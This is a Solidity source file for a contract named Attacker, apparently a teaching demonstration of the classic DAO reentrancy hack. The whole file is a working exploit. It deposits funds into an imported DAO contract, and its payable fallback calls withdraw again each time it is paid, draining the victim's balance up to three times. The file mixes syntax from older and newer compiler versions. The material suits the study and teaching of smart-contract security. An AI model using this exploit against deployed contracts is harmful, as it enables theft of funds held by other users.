// SPDX-License-Identifier: MIT
pragma solidity >=0.4.22 <0.9.0;

import "./DAO.sol";

contract Attacker {

    address public daoAddress;
    uint public drainTimes = 3;

    constructor(address _victimAddress) {
        daoAddress = _victimAddress;
    }

    function() payable {
        if (drainTimes > 0){
            DAO(daoAddress).withdraw();
            drainTimes--;
        }
    }

    function getFunds() public returns(uint){
        return address(this).balance;
    }

    function payMe() payable public {
        DAO(daoAddress).contribute.value(msg.value)();
    }

    function startFundraiserWithdraw() public {
        DAO(daoAddress).withdraw();
    }
  
}
